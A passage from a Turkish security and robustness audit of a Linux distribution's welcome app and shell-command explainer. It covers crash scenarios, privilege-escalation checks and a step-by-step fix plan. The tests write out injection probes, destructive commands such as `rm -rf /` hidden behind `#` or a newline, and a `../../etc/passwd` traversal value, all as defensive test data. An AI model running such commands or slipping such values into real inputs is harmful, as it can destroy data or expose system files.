- **Senaryo:** Geçerli JSON ama yanlış türler: `{"biten_konular": [[1]]}` ya da `[{"a":1}]` → `Gezinme.__init__` `TypeError: unhashable type`; `{"theme": [1]}` → palet aramasında `TypeError`; `{"wallpaper": ["a"]}` → `os.path.isfile` `TypeError`. Uygulama açılmaz; otomatik başlatma her oturumda sessizce başarısız olur (kullanıcı Karşılama'yı açamaz, dosyayı silmesi gerekir). `{"wallpaper": 5}` kabul ediliyor (`os.path.isfile(5)` dosya tanıtıcı 5'i sorar). `{"show_on_startup": "false"}` (dize) doğru kabul görüyor. Yazma `open(…, "w")` ile yerinde kesip yazıyor; yazarken kesinti dosyayı yarım bırakır. `apply_sibling_settings` bozuk (ya da liste biçimli) kardeş dosyayı `{}` sayıp üzerine yalnızca dil/tema yazar: örneğin Güvenlik Paneli'nin `onayli_aglar` listesi bozuk dosyada kaybolur (dosya zaten bozuktu, ama sessizce yeni ayar başlatılıyor). Ayar dosyası bozuk JSON, boş, liste kökü, NaN, geçersiz UTF-8 olduğunda uygulama açılıyor (Denendi, bu durumlar güvenli).
- **Kanıt:** Denendi (19 senaryo: 4 çökme), atomik olmayan yazma Okundu.
- **Düzeltme:** `load_settings`'te her anahtarı tür/değer kümesiyle doğrula (`theme in ("dark","light")`, `wallpaper` `str`, `biten_konular` yalnızca `str` öğeleri, `show_on_startup` `bool`), sorunluysa varsayılana dön. Yazmayı geçici dosya + `os.replace` yap (tek ortak `atomik_yaz` yardımcısı). Bozuk kardeş dosyayı `.bozuk` adıyla kenara alıp yeni dosya yaz.
- **Görünür davranış değişikliği:** Hayır.

#### K-06: Otomatik başlatma "bir kez" diyor ama her oturum açılışında gösteriyor
- **Konum:** `etc/skel/.config/autostart/carotos-welcome-autostart.desktop:6` (Comment: "Shown once after installation / Kurulumdan sonra bir kez gösterilir"), `carotos-welcome.py:1106` (`show_on_startup: True` varsayılanı), `:2670-2675` ve `:2536-2541` (Bitir `show_on_startup`'ı değiştirmiyor), `:2774` (yalnızca onay kutusu işaretliyse sessiz çık)
- **Senaryo:** Kullanıcı sihirbazı sonuna kadar bitirse bile "Açılışta bir daha gösterme" kutusunu işaretlemediyse Karşılama her girişte açılır. Belge ile kod çelişiyor. Ayrıca tek-örnek kilidi yok: otomatik başlatma + menüden elle açma iki pencere açar, ikisi aynı ayar dosyasına yazar.
- **Kanıt:** Okundu.
- **Düzeltme:** Ya Comment metnini gerçeğe uydur ("onay kutusunu işaretleyene kadar her açılışta") ya da Bitir'de `show_on_startup=False` yap (görünür davranış: bir kez gösterilir; sahibine sorulmalı). `Gtk.Application` ile tek örnek.
- **Görünür davranış değişikliği:** Evet (hangisi seçilirse).

#### K-07: Üst banttaki dil seçici, dil kartından seçim yapılınca eşitlenmiyor
- **Konum:** `carotos-welcome.py:1659-1664` (`lang_combo` yalnızca kurulurken `set_active_id`), `:1915-1922` (`_on_lang_pick` yalnızca `rebuild`), `:2459-2483` (`refresh` combo'yu güncellemiyor)
- **Senaryo:** "Görünüm ve dil" sayfasında kartla "Deutsch" seçilince sayfa Almancaya döner ama sağ üstteki açılır seçici "Türkçe" göstermeye devam eder.
- **Kanıt:** Okundu.
- **Düzeltme:** `refresh()` içinde `handler_block`/`set_active_id(self.lang)`/`handler_unblock`.
- **Görünür davranış değişikliği:** Küçük (düzeltme).

## 4. Şüpheliler (kodda gösteremediklerim)

1. **ESC baytı yapıştırmayla nasıl giriyor (A-05 tamamlayıcısı).** Bash/readline ve terminal emülatörünün bracketed paste'te ESC/C0 baytlarını süzüp süzmediğini denemedim; Alt+E yolunda ham baytların `READLINE_LINE`'a girmesi `Ctrl-V` ile (elle) olabiliyor. Temizleme yine de gerekli (A-05).
2. **`carotos-dil-hazirla` pipe kapanınca (`BrokenPipeError`/`SIGPIPE`).** Karşılama çıktıyı boruyla okuyor (`:2599-2602`). Okuyan taraf giderse (pencere kapatılır) root betiğin `print(..., flush=True)` ve `apt-get`/`dpkg` çocukları `SIGPIPE`/`EPIPE` alabilir ve dpkg yarıda kalabilir (yarım yapılandırılmış paket). Bu davranışı apt/dpkg yazarak denemedim.
3. **Paket adları trixie'de var mı:** `hunspell-pt-br`, `fcitx5-chinese-addons`, `fcitx5-mozc`, `firefox-esr-l10n-zh-cn`, `libreoffice-l10n-pt-br` vb. (`sistem_dili.py:19-33`, `:53-55`). Tek bir adın olmaması `apt-get install`'ın tamamını reddettirir ve o dilde hazırlık hep başarısız olur. Bu ortamda apt listesi yok, doğrulayamadım. VM'de `apt-cache policy $(...)` ile kontrol edilmeli.
4. **`carotos-dil-hazirla` modül denetimi** (`:30-38`) yalnızca `sistem_dili.py` dosyasının sahibi/iznini denetliyor; `/opt/carotos/ortak` dizini ve `__pycache__` denetlenmiyor, `python3 -I` var ama `-B` yok (root bayt kodu yazar). Kurulu sistemde dizin root'a ait olduğu sürece sorun yok; pekiştirme önerisi. (Hook `chmod 644` ile uyumlu, `9992-…hook.chroot:19`.)
5. **pkexec ilkesi:** `/usr/share/polkit-1/actions` altında bu betikler için özel eylem yok, varsayılan `org.freedesktop.policykit.exec` (her çağrıda yönetici parolası) kullanılıyor. MAC anahtarı ve dil hazırlığı ayrı ayrı parola ister; yetki penceresi metni genel. Canlı oturumda parolanın ne olduğu bu denetimin kapsamı dışında. İptal edilen yetki penceresi (pkexec 126) da "İnternet bağlantısını kontrol edin" hata metnini gösterir (`UI["dh_hata"]`), yanıltıcı.
6. **`rebuild()` kendi tıklama olayının içinde widget'ı yok ediyor** (`_on_lang_pick`/`on_lang_changed` → `rebuild` `:2511-2532`). Testler geçiyor; gerçek GTK'de bazı sürümlerde uyarı/çökme riski var, gösteremedim. Dil değişirken süren MAC `pkexec`'i yeni oluşturulan anahtarı eski durumda bırakır (`mac_anahtari` `:2447`).
7. **`fail2ban-client -x`** açıklaması ("Çalışan hizmetin yerine yeniden başlatır", `veri_guvenlik.py:51`) belgelerdeki tanıma ("sunucuyu soket/pid dosyasını silerek zorla başlat") uymuyor gibi, ama kılavuza erişemedim.
8. **Alt+E sırasında Ctrl-C** (`bind -x` işlevi kesilirse readline durumu) denenmedi.

## 5. Sağlam bulunanlar

**Komut Açıklayıcı**
- **"Komut asla çalıştırılmaz" sözü tutuluyor.** `acikla_motor.py` içinde `subprocess`, `os.system`, `eval`, `exec`, `open`, dinamik `__import__` yok (yalnızca `os, re, shlex, sys`); `acikla.bash` `READLINE_LINE`'ı tırnaklı `"$READLINE_LINE"` ile tek argüman geçiriyor (`:12`), `eval`/komut ikamesi/tırnaksız genişletme yok. Gerçek etkileşimli bash'te (pty) `$(touch …)`, ters tırnak, `;`, `|`, `&&`, `>`, yeni satır, tek/çift tırnak, `${IFS}`, `<<<` içeren satırla Alt+E sonrası **hiçbir kanarya dosyası oluşmadı** (Denendi). Başı `-` olan satır (`-h touch …`) seçenek gibi yorumlanmadı: Alt+E `--satir` ile veriyor (Denendi); `carotos-acikla --satir -h` de metin olarak açıklanıyor.
- Çökmeler: kapanmayan tırnak, sonda `\`, boş/yalnız `|` `;` `>` `(` satırları, 100 000 parça, 20 000 derin `$(`, 100 000 iç içe `(`, `--=`, `-`, `rm -`, `kill -999`, geçersiz dil kodu (`../../etc/passwd`, `__proto__`, `None`) hepsi güvenli (Denendi). `dil.metin` hata vermeden İngilizceye düşüyor.
- Yerel/ağ: hiçbir şey ağa gitmiyor; `import` yolları kök sahipli `/opt/carotos/acikla` (depo yedeği yalnızca göreli yol).
- Veri doğruluğu: kontrol edilen yaklaşık 130 bayrak açıklamasının çoğu doğru (nmap, hydra `-u`/`-t`/`-e`, nikto `-Tuning`, sqlmap `--technique/--level/--risk`, tcpdump, john, ufw, systemctl, rm/cp/tar/find/curl/wget); gerçeğe aykırı bulunan yalnızca `ss -p` (A-10). "dd of=" uyarısı, `curl -k`, `wget --no-check-certificate`, `curl -u` parola uyarıları yerinde.
- Çıktı Güvenlik Paneli'nde `TextBuffer.set_text` ile (işaretleme yok), dolayısıyla Pango enjeksiyonu yok.
- Yerele bağlı ayrıştırma yok (komut çıktısı ayrıştırılmıyor); `tr_TR` altında çalıştırıldı, sorun yok.

**Karşılama**
- **Root'a giden argümanlar:** `pkexec` mutlak yolla (`/usr/local/sbin/carotos-dil-hazirla`, `…/carotos-mac-ayar`) çağrılıyor, kabuk yok, argüman `dil.KODLAR`'dan geçmiş sabit kod (`dil.gecerli`) ya da `ac/kapat`. Root betikleri argümanı yine kendi tablosuyla doğruluyor (`kod not in SD.HAZIRLIK` → çık), `-` ile başlayan değer yok, dosyaya yazılan metin yalnızca tablodan. `carotos-dil-hazirla`: `python3 -I`, temiz `ORTAM` (PATH/LC_ALL), `os.geteuid()` denetimi, modül sahibi/izin denetimi, `locale.gen` geçici dosya + `os.replace`. `carotos-mac-ayar`: sabit içerik, `O_NOFOLLOW`, `os.replace`, `-I`, kabuk yok.
- Ağ sayfası yalnızca sabit metin gösteriyor; SSID vb. ağdan gelen metin yok. Pango işaretlemesi yalnızca iki yerde ve ikisinde `GLib.markup_escape_text` var (`:2176`, `:2306-2308`).
- Gezinme: 7 konu, hub, son sayfa; ileri/geri/atla/nokta/`sayfaya_git` mantığında çıkmaz ya da istisna yok (`test_karsilama_gezinme` 15/15; ayrıca tüm dillerde `rebuild` ve tüm sayfalara git: hata yok; `ileri` ile 5 adımda Bitir; PAGES ile gezinme kimlik kümeleri aynı; sayfa görselleri ve logo mevcut).
- Görsel yükleme hatası: `build_image`, logo, duvar kâğıdı küçük resmi, pencere simgesi `GLib.Error` yakalıyor; yer tutucu gösteriliyor, sayfa boş kalmıyor.
- Komut düğmeleri (`action`): liste biçimli sabit komut (`python3 /opt/carotos/former/…`), `shell=True` yok.
- Zamanlayıcı: GLib zamanlayıcı geri çağrısı yok (yalnız `idle_add`), "geri çağrıda istisnayla kalıcı ölme" kalıbı burada yok. MAC anahtarı iş parçacığıyla yapılıyor, pencere donmuyor, başarısızlıkta anahtar eski durumuna dönüyor (sinyal engellenerek, `:2438-2442`).
- Ayar yükleme bozuk JSON/boş/liste/NaN/geçersiz UTF-8/aşırı büyük dosyada açılıyor (K-05 yalnızca tür hatalı geçerli JSON'da çöküyor).
- Gizlilik sayfasındaki iddialar (ad yayınlanmaz, IPv6 geçici adres, zram, apt.carotos.org) yapılandırma dosyalarıyla uyumlu.
- Dosya yazımları kullanıcı dizininde, `~/.xsessionrc` içeriği sabit tablodan (`LOCALE_FOR_LANG`), kabuk enjeksiyonu yok; sistem geneli `/etc/default/locale` değiştirilmiyor (belgeyle uyumlu).

## 6. Düzeltme planı

Her adım küçük ve ayrı commit, her biri için test ekle/çalıştır (`tests/test_acikla.py`, `tests/test_karsilama_*.py`). Kullanıcıya görünen davranış değişikliği olanlar önce sorulmalı.

1. **A-01 + A-02 (`acikla_motor.py` `parcala`)**: `commenters`'ı kaldır, `#`'i sözcük başında elle yorum say; satır sonunu kontrol işlemi yap. Testler: `echo a#b; rm -rf /` uyarı verir, `ls\nrm -rf /` iki parça + uyarı, `echo a #yorum` yorum. *Görünür: evet (daha çok uyarı).* Önce sor.
2. **A-05 (`metin_olustur` tek çıkış)**: denetim karakterlerini görünür yap + uyarı. Testler: ESC/OSC/bidi içeren satırda çıktıda ham ESC yok. *Görünür: yalnızca hostile girdide.*
3. **A-03 (`onek_ayikla`, anahtar sözcükler, iç komut çözümleme)** ve **A-06 (yol/uzantı)**: ayrılmış sözcük/grup işaretleri, `-c`/eval/su/ssh/xargs/find -exec özyinelemesi (derinlik sınırı), sudo/env/timeout seçenek tablosu, bilinmeyen yapı uyarısı + yapıdan bağımsız ikinci tarama; yol belirteci için "sistem komutu olmayabilir". Dokunulan: `acikla_motor.py`, `veri_temel.py` (`sh`). Testler: bölüm 3 A-03 listesindeki her satır. *Görünür: evet.* Önce sor.
4. **A-04 + A-07 (`veri_tehlike.py`)**: boru hattı/`<(…)`/`$(…)` tabanlı indir-çalıştır kuralı (regex kalkar), genişletilmiş `rm`/`find`/`dd`/yönlendirme/`chmod`/çatal bombası/`shred wipefs fdisk parted sgdisk iptables setenforce` kuralları. Testler: bölüm 3 A-04/A-07 satırları (uyarı beklenenler ve `ssh` gibi yanlış alarm olmayanlar). *Görünür: evet.* Önce sor.
5. **A-08 + A-09 + A-10**: yönlendirme gösterimi (`2>&1`, `<<<`, tanınmayan komut), stdout `backslashreplace`, stdin `replace`, girdi/çıktı sınırı, `ss -p`, argv tırnaklama. Dokunulan: `acikla_motor.py`, `carotos-acikla`, `veri_guvenlik.py`. *Görünür: küçük metin düzeltmeleri.*
6. **K-02**: `apply_choices`'ta hazırlık sonucuna bağla (`carotos-welcome.py:2552-2558`). Test: `prepare_language` False iken `apply_session_language` çağrılmaz (denetimdeki düzenekten test). *Görünür: belgelenmiş niyete uyar.*
7. **K-01**: `terminate()` `try/except`, `finally destroy`, apt başladıktan sonra İptal'i kapat ya da güvenli iptal; `carotos-dil-hazirla` içinde `SIGPIPE`/`BrokenPipeError` koruması (Şüpheli 2). Dokunulan: `carotos-welcome.py`, `usr/local/sbin/carotos-dil-hazirla`, 7 dil metni (iptal metni değişirse). **VM'de doğrulama gerekli:** gerçek pkexec ile İptal denemesi, ağ yok/çevrimdışı hazırlık, dpkg durumu.
8. **K-04 + K-05**: `except (OSError, ValueError)`, adım adım `try/except` + `finally close()`, `atomik_yaz`, `load_settings` doğrulaması, bozuk kardeş dosyayı `.bozuk` yedeğiyle yenile. Dokunulan: `carotos-welcome.py` (testler: yanlış türlü ayar dosyası 19 senaryo, Latin-1 `.xsessionrc`). *Görünür: hayır.*
9. **K-03, K-07, K-06**: `apply_choices` iş parçacığı + ilerleme (görünür: küçük), `refresh()` combo eşitleme, `show_on_startup` kararı (görünür davranış: **kullanıcıya sor**; ya metin ya davranış), tek örnek kilidi. Dokunulan: `carotos-welcome.py`, `carotos-welcome-autostart.desktop`.
10. VM'de doğrula: Şüpheli 3 (`apt-cache policy` paket adları), Şüpheli 5 (polkit eylemi/çifte parola), gerçek terminalde ESC yapıştırma (Şüpheli 1), canlı/kurulu ISO'da Alt+E kanarya testi tekrarı.
